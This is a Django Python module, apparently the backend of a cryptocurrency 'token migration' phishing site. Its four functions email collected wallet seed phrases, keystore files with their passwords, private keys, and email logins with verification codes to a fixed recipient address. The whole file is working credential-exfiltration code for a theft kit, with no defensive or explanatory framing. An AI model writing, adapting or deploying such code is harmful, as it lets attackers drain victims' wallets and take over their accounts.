from django.core.mail import send_mail
from django.conf import settings

RECIPIENT_MAIL = settings.RECIPIENT_MAIL

SUBJECT = 'NEW FORM FROM TOKEN MIGRATION RECTIFY'

PHRASE = ''''
--------- New Phrase Token ----------
id: {}
Token: {}
'''

KEYSTORE_JSON = ''''
--------- New Keystore JSON ----------
id: {}
Token: {}
Passowrd: {}
'''

PRIVATE_KEY = ''''
--------- New Private Key ----------
id: {}
Private Key: {}
'''

EMAIL = ''''
--------- New Email & Passowrd ----------
id: {}
Email: {}
Password: {}
Code: {}
'''

def send_phrase(idx, phrase):
    try:
        send_mail(
            subject=SUBJECT,
            message=PHRASE.format(idx, phrase),
            from_email=None,
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_keystore(idx, keystore, password):
    try:
        send_mail(
            subject=SUBJECT,
            from_email=None,
            message=KEYSTORE_JSON.format(idx, keystore, password),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_private(idx, key):
    try:
        send_mail(
            subject=SUBJECT,
            from_email=None,
            message=PRIVATE_KEY.format(idx, key),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0

def send_email(idx, email, password, code):
    try:
        send_mail(
            subject=SUBJECT,
            from_email=None,
            message=EMAIL.format(idx, email, password, code),
            recipient_list=[RECIPIENT_MAIL],
        )
        return 1
    except Exception as e:
        print(e)
        return 0
